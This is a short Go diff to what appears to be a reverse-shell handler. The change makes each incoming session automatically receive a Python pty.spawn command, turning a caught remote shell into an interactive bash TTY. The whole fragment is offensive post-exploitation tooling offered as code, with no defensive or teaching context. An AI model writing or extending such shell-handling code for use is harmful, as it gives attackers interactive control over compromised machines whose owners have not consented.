@@ -37,6 +37,9 @@ func sendData(conn net.Conn, data string) {
 
 func handleConnection(s session){
 	status := "pause"
+	fmt.Println("Attempting to spawn tty shell")
+	tty_spawn := "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
+	sendData(s.connection, tty_spawn)
 	for{
 		select{
 		case state := <- s.channel:
